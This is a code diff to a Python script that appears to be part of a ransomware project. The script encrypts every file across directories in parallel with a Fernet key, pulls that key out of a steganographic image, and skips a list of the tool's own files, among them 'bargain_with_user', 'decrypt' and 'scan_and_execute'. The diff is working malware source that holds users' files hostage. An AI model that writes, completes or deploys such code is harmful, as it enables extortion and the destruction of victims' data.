@@ -4,13 +4,15 @@ from concurrent.futures import ThreadPoolExecutor
 from extract import extract_message
 
 
-def encrypt_file(filename: str, f_key: Fernet):
+def encrypt_file(filename: str, key: str):
     """
     Encrypts a single file provided the path of the file and the Fernet key to encrypt it.
     :param filename: Represents the file to undergo encryption
-    :param f_key: Represents an instance of the Fernet Class created with a key.
+    :param key: Represents the key to be converted to an instance of Fernet object.
     :return: None
     """
+    # Converts that key to a Fernet object to gain access to Fernet methods
+    f_key: Fernet = Fernet(key)
     # Assigns the data inside the unencrypted file to a variable
     with open(filename, "rb") as unencrypted_file:
         plaintext = unencrypted_file.read()
@@ -21,11 +23,11 @@ def encrypt_file(filename: str, f_key: Fernet):
         encrypted_file.write(ciphertext)
 
 
-def process_directory(directory, f_key, blacklist):
+def process_directory(directory: str, key: str, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files decrypted.
-    :param f_key: Represents an instance of the Fernet Class created with a key.
+    :param key: Represents the key to be converted to an instance of Fernet object.
     :param blacklist:
     :return: None
     """
@@ -37,22 +39,20 @@ def process_directory(directory, f_key, blacklist):
                 # Combines the path of the directory with the file name to create filepath of file
                 file_path = os.path.join(root, file)
                 # Decrypts the file given the newly generated filepath
-                encrypt_file(file_path, f_key)
+                encrypt_file(file_path, key)
                 print(file)
 
 
 def main():
     # Extracts the key from a specified image
     key: str = extract_message("download.jpg", "Mochi")
-    # Converts that key to a Fernet object to gain access to Fernet methods
-    fernet_key: Fernet = Fernet(key)
 
     # Represents files to avoid for safety
     blacklist: list[str] = ["bargain_with_user.exe", "bargain_with_user.py",
                             "decrypt.exe", "decrypt.py",
                             "encrypt.exe", "encrypt.py",
-                            "extract.py",
-                            "Icon.png",
+                            "extract.py"
+                                        ,
                             "Popup.png",
                             "scan_and_execute.exe", "scan_and_execute.py",
                             "steghide.exe",
@@ -69,7 +69,7 @@ def main():
     # Start a thread for each directory
     with ThreadPoolExecutor() as executor:  # Initialize ThreadPoolExecutor for multithreading
         # Submit each directory to be processed in a separate thread
-        futures = [executor.submit(process_directory, directory, fernet_key, blacklist) for directory in
+        futures = [executor.submit(process_directory, directory, key, blacklist) for directory in
                    directories_to_encrypt]
         # Ensure each thread completes by calling `.result()` on each future
         for future in futures:
